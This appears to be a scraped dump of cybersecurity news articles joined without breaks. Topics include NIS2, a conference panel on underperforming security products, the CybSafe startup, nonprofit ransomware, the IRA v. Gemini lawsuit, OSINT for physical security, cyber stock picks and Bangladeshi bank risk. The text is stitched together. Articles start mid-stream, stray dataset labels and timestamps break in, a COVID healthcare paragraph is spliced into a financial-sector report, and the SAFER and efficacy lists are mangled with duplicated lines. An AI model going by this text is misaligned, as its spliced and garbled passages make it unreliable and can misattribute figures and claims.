Government accountability: Enhancing security governance and making senior executives in a business accountable for any cyber incidents the company may face is a major feature of the NIS2 Directives. It outlines that senior management needs to know security standards and oversee processes aligned to risk management practices, and be capable of managing that risk. “Cyber has to be a board-level and senior management issue, not delegated to technical teams,” Will Dixon, former EU cybersecurity advisor, wrote in his analysis of the NIS2, “Accountability will empower chief information security officers (CISOs), though it also comes with expectations that they can communicate effectively with senior management and be technical and business leaders.” Fines and sanctions: Increased fines and broadened sanctions are two measures that the NIS2 adopts to ensure that businesses will comply with their obligations. The NIS2 mandates a more comprehensive set of powers to be conferred on “competent authorities” ; however, should an organisation fail to either implement the recommendations of an EU security audit or bring security measures into line with NIS requirements, then they can be penalized with administrative fines up to €10 million or 2% of the entity’s total turnover worldwide (whichever is higher). Regulatory fines at this scale in other jurisdictions, notably in the US and UK, have generated greater cybersecurity measures. For example, penalties leveraged on Uber , Equifax and British Airways have all seen marked improvements in their respective cyber-resiliency. Incident response mandate: As a measure to close the gaps in security incident reportage, the NIS2 Directive is making reporting “significant” incidents mandatory. The definition of what constitutes a “significant attack” on an entity has been clarified. It will no longer be a defined metric (number of impacted users) but rather whether there was disruption to critical services, or financial or material loss. Also, notifications have been reduced from 72 to 24 hours, and reporting will be to users of services and potentially the public.

Taken together, these revisions seemingly incentivise greater responsibility to securing cyber estate and provide greater transparency to all parties affected by a potential breach.

Why is the EU rolling out the NIS2 Directives?

The European Union had sought an open public consultation on the evaluation and impact assessment of the original NIS Directive in 2020, which turned up some gaps that the new Directive seeks to address.

Fragmented implementation: The implementation of the NIS1 Directive was independently done by member states because the rules were not defined to apply centrally. This resulted in fragmenting the EU Single Market, which comprises all 27 member states and a few others as part of the European Economic Area, as companies are beholden to individual member states’ security rules. One of the top criticisms of the NIS1 Directive was the inconsistencies in the ways member states draw up lists of operators of essential services (OESs) and digital service providers (DSPs). The NIS2 implements notes that this fragmentation allowed companies to escape accountability and the new directive will be looking to centralise the cybersecurity rules to make companies answerable before the European Commission for any breach or attack they may have faced. Supply chain protection: The rising number of cyber attacks on supply chain networks is a major concern for the European Union and the NIS2 Directive seeks to improve the situation by placing “harmonised” measures to “strengthen the security requirements, address the security of supply chains, streamline reporting obligations, and introduce more stringent supervisory measures and stricter enforcement requirements.” A supply chain is the network between a company and its suppliers to produce and distribute a specific product to the final buyer. The Directive also seeks to define the relationship that the various links on the chain have with each other and for the first time will cover resiliency measures for the information and communication technology supply chain. Improve collective capabilities: One of the weaknesses that the EU’s Agency for Cybersecurity (ENISA) found in its analysis of the first NIS Directive was that individual members had independent capabilities to respond to threats and therefore, categorised them differently. This had adversely impacted the EU’s collective cyber resiliency. The new Directive seeks to improve the level of joint situational awareness and the collective capability to prepare and respond, by: taking measures to increase the level of trust between competent authorities sharing more information-setting rules and procedures in the event of a large-scale incident or crisis Internet of Things: The Internet of Things (IoT) refers to the interconnection via the internet of computing devices embedded in everyday objects, enabling them to send and receive data. Put simply, it is supposed to connect everyday appliances such as lighting, refrigerators or ovens to the owner’s phone. The ENISA predicts that 22.3 billion IoT devices would be in use around the world by 2024 , therefore, leading the NIS2 Directive to consider mandating resiliency initiatives covering both the user’s control device and the individual IoT devices hooked to it. 5G: The security of the upcoming 5G networking is one of the key aspects of the NIS2. By the end of 2020, the European Council had begun the accelerated deployment of very high capacity and secure 5G network infrastructures, urging the member states to make full use of the 5G specific cybersecurity toolbox in their operations. The security guide identifies security risks related to 5G networks and the 5G supply chain at the EU level.

What is the current situation in Europe with NIS1?

The NIS1 Directive went into effect in August 2016, and all member states of the European Union were given 21 months to incorporate the directive’s regulations into their own national laws.

The aim of the NIS Directive was to create an overall higher level of cybersecurity in general. The directive significantly affects digital service providers (DSPs) and operators of essential services (OESs). OESs are those organisations who engage in critical societal or economic activities and whose operations would be greatly affected in the case of a security breach. Both DSPs and OES are now held accountable for reporting major security incidents to Computer Security Incident Response Teams (CSIRT).

While DSPs are not held to regulations as stringent as those for operators of essential services, DSPs based outside the EU (but still operating there) face stiff regulations. Even if DSPs and OESs outsource the maintenance of their information systems to third parties, the NIS Directive still holds them accountable for any security incidents.

The member states of the EU are required to create an NIS directive strategy, which includes the CSIRTs, in addition to national competent authorities and individual points of contacts for each member state. These resources are given the responsibility of handling cybersecurity breaches in a way that minimises impact. In addition, all member states of the EU are “encouraged” to share cyber security information.

Security requirements include technical measures that manage the risks of cybersecurity breaches in a preventive manner. Both DSP and OES must provide information that allows for an in–depth assessment of their information systems and security policies. All significant incidents must be notified to the CSIRTs.

Joe Hubback of cyber risk management startup ISTARI led both the panel and the study, which was based on in-depth interviews with more than a hundred high-level security officials, including CISOs, CIOs, CEOs, security and tech vendors, evaluation organizations and government organizations.

Hubback said that “90% of the people that I spoke to said that the security technologies they were buying from the market are just not delivering the effect that the vendors claim they can deliver. … Quite a shocking proportion of people are suffering from technology that doesn’t deliver.”

A number of reasons for that product failure came out in the panel discussion, but they can be boiled down to some key points:

Cybersecurity buyers are pressed for time and most don’t test the products they buy. “They’re basically just buying and hoping that the solutions they’re buying are really going to work,” Hubback said.

Vendors are under pressure from investors to get products to market quickly and from sales and marketing teams to make aggressive claims. On top of those pressures, it’s difficult to architect tools that are effective for a range of complex environments – and equally difficult for buyers to properly assess these “black box” solutions.

A ‘Market for Lemons’

Those dynamics create an “information asymmetry,” where vendors know their product and its strengths and weaknesses, but buyers don’t have the time or information to understand all their options.

“This information asymmetry is the classic market for lemons, as described by George Akerlof in 1970,” said Hubback. “A vendor knows a lot more about the quality of the product than the buyer so the vendor is not incentivized to bring high-quality products to market because buyers can’t properly evaluate what they’re buying.”

Panelist Greg Rattway, a former JP Morgan Chase managing director and co-founder of cyber risk management firm Next Peak, took issue with the term “lemons.”

“Vendors are not trying to develop lemons,” Rattway said, “but the challenge is trying to develop a tool that will do the things that marketing says you have to market aggressively, and therefore the claims for the tools and the technologies are so dramatic, but the complexity of the environment almost makes it impossible for development of a single technology or tool that will actually solve problems in a complex environment.”

Grace Cassy, co-founder of the CyLon cybersecurity startup accelerator, and a number of others agreed that the complexity of IT environments makes the challenge for product development teams – and buyers – even greater.

“It’s hard to generalize from a test environment,” Cassy said. “What works in a test environment might not in another environment.”

One audience member said a network of peers can be helpful forbuyers – but his network discusses use cases a product is effective for rather than generalizing product opinions.

And with marketing and sales budgets far outweighing product development budgets, some said vendors might even welcome pressure from buyers to be less focused on financial results and more focused on product development.

Buyers Need to Improve Too

Two-thirds of the security pros interviewed by Hubback said cybersecurity buyers need to do better too. Part of that is organizing and placing demands on vendors.

To that effect, Hubback, Cassy, Rattway, and University of Oxford government professor Ciaran Martin – the founding head of the UK National Cyber Security Centre – discussed efforts to develop the Buyer’s Charter for SAFER cybersecurity, dubbed “a vital next step to address the market failings.”

SAFER stands for:

Symmetry : Fixing the “symmetry of information” problem

: Developing transparent assessments Freedom that allows for maintaining innovation and new market entrants

that allows for maintaining innovation and new market entrants Efficacy : Developing a framework for defining efficacy

Hubback said the group is essentially proposing something similar to GSMA’s role in setting telecom standards, “a demonstration of ability.” He invited RSA attendees to join the group’s efforts.

Defining Cybersecurity Product Efficacy

Hubback said cybersecurity product efficacy depends on four things: capability, practicality, quality and provenance.

Capability : Does this technology have the capability to deliver what was promised and can the effectiveness be demonstrated?

: Does this technology have the capability to deliver what was promised and can the effectiveness be demonstrated? Practicality : As Hubback put it, “Is this actually something I can use in my company without needing some kind of Top Gun pilot to fly it and make it work?”

: As Hubback put it, “Is this actually something I can use in my company without needing some kind of Top Gun pilot to fly it and make it work?” Quality : How well designed and built is the solution to avoid vulnerabilities and negative impact?

: How well designed and built is the solution to avoid vulnerabilities and negative impact? Provenance: How much security risk is in the vendor and its supply chain, based on how they work and who they are?

“Now clearly there are some efficacy measures like, is it in the Magic Quadrant, or do all the other CISOs who I text say that this works?” Hubback said.

But he noted: “As an industry, it’s quite interesting that we don’t really have a structured way of doing it today, so this is one of the things we’re sharing from this research is a proposed view of how to define the efficacy of security technologies.”

With increasing incentives to tackle cyber threats and digital resilience concerns, G7 nations have formally agreed to share their expertise to prevent and mitigate cyber risks.

The dramatic digital transformation underway worldwide, driven by the disruptions from COVID-19, is fueling a surge of technology innovation and sparking economic growth opportunities across global markets. Quarantine lockdowns, supply chain issues, and the transition to a remote workforce that occurred amidst the pandemic combined to radically alter the business-consumer experience and reshape economies.

Despite the societal upheavals, the pandemic brought an unexpected benefit: a seismic shift away from traditional crisis response and a new reliance on advanced technologies that help enterprises keep pace with rapid change. Over the last two years, we’ve seen the unprecedented acceleration of digital innovation that is spurring productivity, driving growth, and reimagining how organizations connect with key stakeholders.

Building digital resiliency

At the core of this transformation is digital resilience, the “next normal”. Resilient organizations leverage end-to-end, tech-driven strategies to respond rapidly to disruptive events while maintaining a firm focus on competitiveness. Digital resilience creates economic advantage through agility, positioning an enterprise to pivot fast, adapt to fluid conditions, maintain seamless business continuity, and capitalise on market opportunities.

From the local workspace to the global marketplace, digital resilience strengthens market performance and fosters economic growth, even in times of uncertainty. Whether it’s a global pandemic or rising inflation, leaders are finding that investing in the future continues to pay dividends. Technology provides leaders with the ability to manage risk and seize new opportunities. It can improve the ability to act on customer demands and provide detailed data analytics for making effective business decisions.

Digital resilience: a new window of opportunity

Throughout the pandemic, resilient industries have continually ramped up investments in digital transformation, pivoting almost overnight with emerging solutions.

Amidst new and evolving risks, leaders now have a window of opportunity to shape the future of digital transformation. Now is the time to get in on the ground floor and align the skills, strategies and solutions needed to build transition frameworks across society. Public and private sector leaders can collaborate to build practical roadmaps for collective resilience that would contribute to economic growth and global innovation.

Building global collaboration to combat cyberthreats

Already, governments around the world are focused on building digital resilience by demonstrating their commitment to international cooperation on behalf of their citizens. The looming escalation of cyber risks, malicious cyber activities and ransomware attacks are central to the discussion.

Issuing a wake-up call in its recent “Global Risks Report”, the World Economic Forum points out that global leaders identified cyber risk as a major digital challenge, with 64% of respondents expecting they will experience a disruptive event within the next year. Nearly one in five (19.5%) respondents believe cybersecurity failures will be a critical threat to the world in just the next two years, and 14.6% project a critical threat within two to five years.

With increasing incentives to tackle cyber threats and digital resilience concerns, G7 nations have formally agreed to share their expertise to prevent and mitigate cyber risks. This is an important step in protecting businesses globally as they transform at speed. In their G7 Communique, the G7 Finance Ministers and Central Bank Governors agreed to work on priorities that ensure the world’s financial sector remains resilient and well-protected against the threat of cyber-attack.

Balancing innovation, resilience and defence to build trust

As global momentum builds for a safe and secure digital transformation, economic recovery and growth depend on earning the public’s confidence with a three-tiered approach. The balance of innovation, digital resilience, and the safeguard of a strong, digital defence is crucial to gaining and maintaining the trust of people and businesses across the globe.

We must work together to build a solid framework of trust. Nothing has a higher priority on that front than the protection of critical data. And the sheer volume of data being consumed and transmitted in recent years is no small challenge.

Global Data Protection Index

On average, international organizations are managing 10 times more data than five years ago, according to the Dell Technologies 2021 Global Data Protection Index survey of global IT decision-makers. Our research shows that 44% of businesses surveyed experienced more cyberattacks and data loss during this past year or so, and more than 67% lacked confidence that all business-critical data can be recovered in the event of a cyberattack. 82% of customers do not believe their current data protection product is sufficient to handle future business challenges.

Now is the time for government and business leaders to work together to enhance digital resilience and unlock the power of data for the benefit of all.

Partnerships in action

In Europe’s health care community, for example, the quest for tech innovation led to the European Health Data Space Regulation. The EHDS details a European framework for success that establishes a single market space for health data to empower individuals who seek easier access and greater control over the privacy of their personal health data.

The European Union has also staked a claim in the race for innovation, announcing its vision for a Digital Decade. The EU set a deadline goal of 2030 to address gaps in the tech revolution and advance an agenda of business transformation, secure digital infrastructure, digitalisation of public services, and cyber skills. Other countries and regions across the world are taking a similar approach with digital and cyber resilience now at the core of economic planning.

Economic opportunities from digital resilience, new tech and cyber skills

Progress on the path to digital resilience not only prepares organizations in the public and private sectors for a potential crisis, but also creates economic growth. One vital innovation that empowers economics is the adoption of emerging technologies, including Artificial Intelligence (AI), machine learning and the Internet of Things (IoT). These advanced tech tools can deliver new efficiencies, accelerate data-driven decisions, and help bring new products and services to market faster than ever before while also maintaining trust in a global digital economy.

But we cannot harness these opportunities without tackling cybersecurity and addressing the global shortage of qualified cybersecurity staff. The economic cost of security breaches reached a staggering $4-6 trillion in 2020, equivalent to about 4-6% of global GDP, according to the UNCDF. And we lack the trained personnel to counter the costs.

This SaaS product with a per-user-based, subscription licensing model has a “behavior-led” platform that manages people-related security. In other words, it uses behavioral science and data analytics to help employees be more cybersecurity aware.

Users get microlearning content and personalized “nudges,” available in nine different languages, delivered via a mobile application or browser.

The company claims that this approach means that organizations can then “peer into” their workforce’s security behavior, culture and risk reporting to preempt security problems and track improvements over time. CybSafe claims this approach is 40%-60% more effective at influencing certain security behaviors and more helpful for users than the traditional approach to security awareness.

CybSafe clients include Credit Suisse, Barclays Bank, HSBC, FNZ Group and Moody’s. It also has a strategic partnership with telecoms giant, Vodafone.

CybSafe’s competitors include KnowBe4 (raised $393.5 million), SoSafe (raised $73 million), Proofpoint, Wombat Security (raised $10.9 million) and Infosec.

Launched in 2017, the company was founded by cyber resilience and intelligence expert, Oz Alashe MBE (above), a former lieutenant colonel in the British army, who was also the first Black officer to serve in the parachute regiment and U.K. special forces. Needless to say, he’s also a rare Black tech founder in a generally non-diverse U.K. and European tech scene.

Alashe launched CybSafe after realizing that “most of the security industry’s attempts to address this challenge centered on ‘tick box’ training or an over-reliance on phishing simulations. Very little of it is grounded in any clear scientific evidence or backed up by any solid data,” he said.

“We’re building software that will get increasingly effective through the delivery of behavior change micro-experiments. In doing so, we remove the guesswork from security awareness,” he added.

Karthik Subramanian, partner at Evolution Equity Partners, said:

We invest in founders with disruptive cybersecurity offerings that are reimagining how businesses approach the increasing depth and breadth of cyber threats. CybSafe designs their products with the user in mind, ensuring they are tackling the cause rather than simply treating the symptoms of cyber risk. CybSafe goes far beyond traditional compliance-driven approaches to security awareness and instead focuses on delivering a genuine reduction in human cyber risk.

According to the Forrester Wave Report, CybSafe has “pioneered a new approach to SA&T (security awareness and training) that uses data and metrics to change behavior and instill a security culture.”",Cybersecurity Failure,2022-06-09 07:01:21

Nationally, a 2020 breach at Blackbaud, a cloud software provider to nonprofits, affected an unknown number of organizations and individuals nationally, including University of Detroit Mercy here in Detroit.

In January, more than 300,000 customers of ShopGoodwill.com were impacted by an attack. And a March breach at Partnership HealthPlan of California compromised the names and Social Security numbers of a reported 850,000 people, sparking a class action lawsuit against the organization.

The list of nonprofits breached locally is also growing. It includes: Ascension Michigan, Beaumont Health, Michigan Medicine, Trinity Health Systems and UDM.

Given that personal, protected data was compromised, either through a third-party data management company like Blackbaud or attacks on their own systems, those nonprofits were required to disclose the breaches.

Those types of larger organizations are generally targets because they have resources to pay ransoms, experts say. But mid-sized and smaller nonprofits that have backburnered IT investments so they can put more dollars toward the mission are low-hanging fruit, Derigiotis said: ""It's just a numbers game.""

Donors can also be targets, he said.

""In some of these cases, you may have ransomware operators call (donors) to make them aware of the breach, to harass them, to threaten them and also to get money directly from them.""

Fortunately for Southwest Solutions and everyone connected with it, personal employee, donor and client data were not compromised, and it had taken out cybersecurity insurance just a year earlier, despite financial troubles at the time.

The insurance paid a team of professionals to help Southwest Solutions recover from the attack and covered the ransom, Sherman said. But nearly three years later, the nonprofit is still working to manually construct much of its financial data that was lost when the decryption key the hacker provided failed to unlock all of its data.

The intruder didn't care that it was dealing with a charitable nonprofit, Sherman said.

On Monday, a case was brought in the United States District Court, Southern District of New York, by IRA Financial Trust against Gemini Trust Company under multiple civil law causes of action. These causes of action have been around for hundreds of years, even though the subject matter is still in its infancy. But this one stands out, as cybersecurity advertising prior to a security breach was specifically mentioned in the lawsuit.

The Lawsuit Players

IRA is a regulated South Dakota trust company who essentially manages trust accounts for customers as the extent of their business. Trust companies know the assets that can and cannot be put in trust accounts and what type of accounts (such as retirements) can be held in trust. As a practice, they do not control the assets nor do trust companies give financial advice or sell investments. Gemini is a New York company that operates a cryptocurrency exchange where customers buy and sell those assets. Companies like Gemini are often referred by companies such as IRA to their customers as someone that provides the custody and transaction part of asset management of a trust.

The cyber breach

The complaint, which numbers thirty-four pages, spends at least six of them on Gemini’s advertising of services and security in 2019 (The Wayback Machine is a powerful weapon), to include making the actual ad part of the complaint. It focuses on claims such as “we set the standards for crypto cybersecurity”, “deeply committed to employing cybersecurity best practices”, and “the majority of your cryptocurrency is held in our office offline” (using the term Cold Storage which is essentially air gapping, for those that deal with classified material).

Without getting too technical, the problems allegedly arose when Gemini’s customer load exceeded the capacity of the storage accounts and thus caused Gemini to deviate (again allegedly) from standard practices and use an Advanced Programming Interface (API) that that allows IRA and Gemini customers to trade crypto with the open market and each other but only with the use of encrypted API keys.

Predictably, an individual (John Doe) pretended to be a real IRA customer and was able to log in and transfer cryptocurrency from other customer accounts to Doe’s account. IRA alleges the individual was able to do that because of a “single point of failure” (the API key) in the new software interface. Interestingly, Gemini sent emails to their IRA customers, blaming IRA for losing control of the API interface keys. The complaint alleges the standard causes of action one sees in a security breach case, such as negligence, fraud, breach of contract and violation of state law. Essentially, what we have is a not adhering to original promised standards by Gemini vs. negligent control of a necessary system entrusted to IRA and its customers. Something tells me this lawsuit was filed in anticipation of incoming customer litigation as a way to get ahead of the blame train.

People Behind the Technology

Just like anything else that touches the internet, cryptocurrency for all of its safeguards, is not immune from compromise. Whether it be not discovering a flaw in the software, using a different system or method than advertised, or negligent control of security keys, humans drive all of those acts and remain the one constant in cybersecurity incidents of all types.",Cybersecurity Failure,2022-06-09 16:45:38

Since many aspects of physical security are connected to the internet, enterprises have started to build fusion centers that combine disciplines. By doing so, they are able to converge cyber and physical security, close gaps in coverage, and scale security to protect facilities and hundreds of thousands of employees. The key to this convergence lies in open-source intelligence and how it can enrich many aspects of a physical security program.

Broadening the Definition of Open Source Intelligence

Many aspects of open source intelligence are similar or equivalent to traditional all-source intelligence methodologies seen in the intelligence cycle. Two main categories of datasets to map are traditional open source intelligence and non-traditional open source intelligence. Traditional open source intelligence datasets encompass the qualitative and quantitative collection and analysis of public, non-classified sources that deliver context such as archives, business records, dating sites and dark web. Non-traditional open source intelligence datasets include the human, signals, and imagery intelligence equivalents in OSINT– based on anything from threat actor engagement on social media to external telemetry (netflow, passive DNS, cookies) to social media photos used to pinpoint locations.

Defining the Key Capabilities of a Cyber Threat Intelligence Program

Before we dig into how cyber threat intelligence benefits a physical security program, let’s identify a list of some of the services, products, and analyses that a CTI program might address. The following services have significant overlap with physical security programs:

● Adversary infrastructure analysis

● Attribution analysis

● Dark Web tracking

● Internal threat hunting

● Threat research for identification and correlation of malicious actors and external datasets

● Intelligence report production

● Intelligence sharing (external to the organization)

● Tracking threat actors’ intentions and capabilities

Other CTI services generally do not overlap with physical security and remain the responsibility of cyber security teams. These services include malware analysis & reverse engineering, vulnerabilities research, and indicator analysis (enrichment, pivoting, and correlating to historical reporting).

Defining Overlap with CTI and Physical Security Programs

Security teams are now leveraging open source intelligence and cyber threat intelligence to provide critical information to physical security practitioners. The physical and corporate security programs of these teams generally consist of the following disciplines, with use cases that are at the center of the convergence of cyber and physical security disciplines:

● Executive Protection and Physical Asset Protection

○ OSINT and dark web monitoring to identify fake social media accounts misrepresenting or targeting executives, employees, negative sentiment, protests, and planned attacks against physical assets.

○ Tracking threat actors’ intentions and capabilities attempting to degrade a company’s brand

○ Adversary infrastructure and attribution analysis of identifying spearphishing against executives, intellectual property, facilities, or employees.

○ Intelligence sharing with federal or industry partners to disrupt threats and threat actors

○ Monitoring of open or closed source forums to identify the collusion of internal and external threat actors

○ Heat maps to identify crime rates and potential risks to foreign physical locations or future locations

● Travel Security

○ OSINT and social media geolocation monitoring to determine unrest, negative sentiment, or hostilities that could delay or disrupt travel plans

○ Tracking Travel patterns of personnel that may pose risk to executives or facilities

○ Intelligence sharing with federal or industry partners if an executive or employee is in danger and needs to be removed

● Regulatory/Environmental Risk Specific to Business

○ OSINT and dark web monitoring to identify vendors doing business with high-risk foreign nationals or nation-states

○ Attribution analysis to identify individuals presenting a regulatory or environmental risk to the business

○ Foreign press and media analysis of regulatory and environmental risk to the business

● Geo-Political Risk

○ Foreign press and media analysis of ongoing nation-state tensions that impact business

○ Adversary infrastructure analysis of disinformation threats on platforms of hostile governments targeted innocent civilians who are employees of an enterprise

○ Threat research to find and correlate malicious actors with external datasets

● Global Investigations

○ Collaboration between investigators, general counsel, and human resources to inform enforcement and policies that reduce risk.

○ Disruption of threat network through legal action

○ Identification of actors through public release, attribution, sharing with law enforcement and policymakers

○ Informing industry enterprises and researchers, and warning victims

It is more and more clear that physical and information security disciplines have large overlaps. The use of OSINT to review coverage gaps and identify problems is not a small project and can take up to 18 months to complete according to GSOC and cyber threat intelligence professionals. However, when executed properly, open source intelligence is not only a critical enabler in today's risk management landscape, but also a key decision and collaboration tool for business unit stakeholders.

It’s hard to tell when the selling will end. There has already been an excessive amount of damage that’s already been done to many of the hyper-growth names — especially those within Cathie Wood’s ARK line of funds. That said, it’s difficult to judge when the bottom is in, given the trajectory of interest rates and rising recession risks.

Despite all the storm clouds passing through the tech sector, cybersecurity stocks remain an intriguing place to be. Cyberthreats will always be present, regardless of where GDP is for any given quarter. The current slate of beaten-down cybersecurity stocks may be worth a second look, given their recession resilience and secular trends that only stand to get stronger with time.

Though valuations are still a tad stretched on popular cyber stocks, Wall Street remains upbeat despite the negative momentum in the rear-view mirror. In this piece, we’ll use TipRanks’ Comparison Tool to evaluate three cybersecurity plays.

CrowdStrike (CRWD)

CrowdStrike is a major player in the endpoint security space, with growth that continues to shock and awe. The software-as-a-service (SaaS) company, which provides cloud-based protection solutions to its clients, recently clocked in a magnificent first quarter. Per share earnings of $0.31 came in well ahead of analyst expectations of $0.23. Revenue growth, coming in at 61% year-over-year, was also worthy of applause.

Undoubtedly, the world needs the company’s services more than ever, with cyberthreats constantly on the rise. With such a high growth ceiling and an ever-improving ecosystem, CrowdSrike may have one of the stickiest offers in the cybersecurity space.

Though the recent quarterly beat caused a bit of relief for shares of CRWD, it remains off more than 42% from its all-time high hit in the back half of 2021.

As rates stabilize, expect CrowdStrike’s impressive results to become more influential on the stock price than the broader market. Though it’s unlikely CRWD stock can power higher until market-wide fears are put to rest, I view the growth company as one of the babies thrown out with the bathwater. Recession or not, demand is likely to remain robust over the medium term.

At 23 times sales, investors will still have to pay up for the quality growth stock. Wall Street thinks the premium is well worth paying, with the average CrowdStrike price target at $236.87, implying 40.18% upside from current levels.

ZScaler (ZS)

ZScaler is another cloud-based provider of security solutions with a focus on larger enterprise customers. With a wide range of invaluable services, including cloud firewall and data loss prevention, ZScaler is a firm that can continue to grow into the next economic downturn.

From peak to trough, ZS stock lost around two-thirds of its value. Indeed, shares should have never run north of $360 per share. At writing, ZS stock trades at 22.8 times sales, a similar range as CrowdStrike.

With a zero-trust architecture and an ecosystem that could lock in big-league enterprise clientele, ZScaler is bound to be a core holding in any cybersecurity-focused ETF.

Fresh off a third-quarter beat that saw per-share earnings of $0.17, ahead of the consensus of $0.11, ZS stock finds itself on unstable ground. As of the firm’s third quarter, there’s no evidence of a slowdown, with revenue surging 63% year-over-year due to big wins and effective cross-selling. Indeed, it still seems to be full speed ahead for the fast-growing firm that looks poised to build a wall around its ecosystem.

With the enterprise likely to be more resilient than the inflation-hit consumer in the next recession, I expect ZScaler will continue to impress as it looks to stay a step or two ahead of the attackers.

Though Wall Street analysts have been lowering the bar on their price targets over the past month, most remain bullish, with the average ZScaler price target at $210.92, implying 33.01% upside from today’s close.

Fortinet (FTNT)

Fortinet stock has held its ground, besting the three cyber stocks in this piece, down just 33% from peak to trough. Today, the stock is off just 20% from its all-time high, with a much lower 13.3 times sales multiple.

Though the cybersecurity and networking solutions provider is also fresh off a handful of quarterly beats, the stock is cheaper than the likes of a CrowdStrike or ZScaler for a reason. It’s growing slower, with its most recent quarter posting 34.4% in year-over-year revenue growth.

In a rising-rate environment, lower-growth names with more modest multiples may be better buys to protect against further Fed-induced downside. Though Fortinet is profitable, it’s still an expensive stock at over 77 times trailing earnings.

Undoubtedly, competition remains fierce, and the firm will need to keep R&D elevated to stay ahead of rivals and cyberthreats. Recently, the company introduced its AI-powered FortiNDR. The platform leverages the power of self-learning AI in network protection.

Turning to Wall Street, analysts are bullish, with the average Fortinet price target of $360.38, implying 21.35% upside from current levels.

Conclusion

Cybersecurity stocks are the cheapest they’ve been in a while. On the three names, analysts expect the most from CrowdStrike stock and the least from Fortinet stock in terms of year-ahead returns.

However, the industry as a whole is largely projected to do well, as demand consistently increases along with the general digitization trends, as well as the shifting world order and cyber threats from Russian state-backed organizations.

COVID-19 Impact Analysis

The pandemic of COVID-19 has also reduced the availability of and demand for non-COVID-19-related medical treatment. A wide range of treatments, including emergency care for acute diseases, routine check-ups, and recommended cancer screenings, are being postponed or avoided by patients. Undiagnosed illnesses and a failure to intervene early will have serious long-term health consequences. COVID-19 has accelerated a variety of existing and emerging healthcare trends, including changing consumer attitudes and habits, the convergence of life science and health care, rapid advances in digital health technologies, and new talent and care delivery models, to name a few.

Cyberattacks and data breaches in financial services firms are more common than in any other industry. In 2017, a data breach at Equifax created a turmoil in the global markets, since more than 143 Mn consumers were affected by that. Also, incidents like the WannaCry and Petya ransomware in 2017, which badly affected Russian and Ukrainian banks, further exposed the world to direct financial threats posed by cyberattacks. These incidents highlight the urgent need for stringent cybersecurity in financial firms.

Based on end user industries, the market is segmented into banking, insurance, stock brokerages, credit unions, investment funds, card and mobile payments, and governments. Among these segments, the card and mobile payments segment is expected to register a high growth rate through the forecast period of 2018-2023. Given that card and mobile payments are being adopted swiftly as a mode of cashless transactions, the risk of cyberattacks increases due to the critical nature of the financial data transmitted in each payment.

By solutions and services, the global cybersecurity in financial services market is categorised into mobile enterprise management, endpoint security, identity and access management (IAM), mobile security, security information and event management (SIEM), content security, data loss prevention (DLP), datacenter security, and firewall. The mobile enterprise management solution segment is expected to have the highest growth rate owing to its wide adoption in contactless payment systems within various industries.

By regions, the market is segmented into North America, Europe, Asia-Pacific, Latin America and the Middle East and Africa. Asia-Pacific is projected to grow with the highest CAGR through the forecast period of 2018-2023.

Key growth factors

Incidents of data breaches are on the rise, thereby having an impact on the digitization of financial services like cashless payments via cards and mobiles. Hackers are finding this sector extremely vulnerable to prey upon. Thus, the threat of cyberattacks on the financial services sector is increasing and consultants are increasingly looking into ways to reduce such cyber risks. This is a major driver for the adoption of cybersecurity in the financial services sector.

In 2016, financial services customers suffered over 60% more cyberattacks than customers in any other sector. This increase in the number and scope of attacks on the financial sector is necessitating governmental actions and policies to curb it. Federal laws like National Cybersecurity Protection Advancement Act, Cybersecurity Information Sharing Act (CISA), etc. are helping accelerate the adoption of cybersecurity in the financial sector.

Threats and key players

Although cybersecurity in financial services market is expected to have positive growth globally, lack of adequate funds may act as a hindrance to the growth of the market. Buyers are allocating exorbitant budgets to tackle cyberattacks but the nature of the crimes is evolving every passing day. Spending on new types of cybersecurity tools and services for companies is a major problem for the financial sector and may hinder the growth of the market.

The major cybersecurity providers operating in the financial services market are Experian Information Solutions Inc., IBM Corporation, Accenture PLC., Airbus SE, AlienVault, Inc., etc.

A high risk of cyber-attacks looms large over 36 per cent of banks in Bangladesh mainly due to a shortage of investment in strengthening security measures, skilled personnel and a lack of awareness among bankers and customers.

In addition, another 16 per cent of banks are in a very high-risk condition, an indication of the fragile cybersecurity scenario in Bangladesh's banking sector, according to research carried out by the Bangladesh Institute of Bank Management (BIBM).

Md Mahbubur Rahman Alam, an associate professor of the BIBM, presented the findings at a cybersecurity summit organised by the Association of Bankers Bangladesh (ABB) at the Pan Pacific Sonargaon hotel in Dhaka.

Only 12 per cent and 4 per cent of banks are now in low and very low-risk zones, respectively.

The BIBM carried out the research based on the situation of the banking sector as of 2020.

Although the banking sector has observed a ""dreadful growth"" in IT infrastructures, there has been a lack of security measures to protect banks from cyber-attacks.

Alam said banks had invested Tk 42,609 crore to build IT infrastructures and run the system till 2020.

The number of employees in the banking sector stood at 1.94 lakh in 2020, of which 5,875 were deployed to run their IT infrastructures.

""The top local educational institutions such as Dhaka University and Bangladesh University of Engineering and Technology are unable to produce the experts what we need,"" Alam said.

For the lack of IT experts in the banking sector, the majority of lenders are trying to recruit people offering high salaries, but they are failing to fulfil their demands, he said.

When faced with IT-related problems or loopholes, all lenders usually make a mad dash for a solution, he said.

But this should not be the practice for banks, he said, suggesting lenders take up long-term initiatives to strengthen their IT operations.

""Banks should take a long-term initiative by spending at least 4 to 5 years to establish a sound and secure IT platform,"" he said.

Only 18 banks out of 61 have so far built security operations centres (SOC) to monitor, prevent, detect, investigate and respond to cyber threats.

Bangladeshi banks face the highest number of cyber-attacks from China, which is 24 per cent, followed by 13 per cent from North Korea, and 7 per cent from the United States and Pakistan, respectively.

IT vendors, meaning entities and persons who supply software and hardware and set up those in banks, have largely been found to be responsible for cybercrimes.

Of all security breaches in banks, 27 per cent are committed by these vendors, 24 per cent by unknown hackers and 16 per cent by both bankers and hacktivists, respectively.

There is also little IT security awareness among bankers, with 28 per cent in a ""very poor"" condition and 22 per cent in ""poor"".

Only 4 per cent of bankers have excellent knowledge on the issue.

Alam proposed establishing a ""Bangladesh Institute of Electronic-Banking Research and Development"" to bolster the IT sector in banks.

Banks are gradually shifting towards online and digital banking to keep up with changing demands, said Bangladesh Bank Governor Fazle Kabir, who inaugurated the two-day summit titled ""Building Cyber Resilience for Banks"".

There are risks and challenges in using technology that enables banks to do digital banking, he said.

""There are organised fraudsters who try to break into banks' IT infrastructure, which is why lenders have to invest a lot in cyber security.""

Integrated cyber security has emerged as a part and parcel of everyday banking operations, Kabir said.

He also touched upon the ongoing volatility in the country's foreign exchange market.

He claimed that Bangladesh's foreign exchange reserves were still in a comfort zone.

The reserves stood at $41.7 billion last week, which is good enough to settle import bills for more than five and a half months.

Selim RF Hussain, chairman of the ABB, said cybercrimes in the financial sector had risen globally in the last few years.

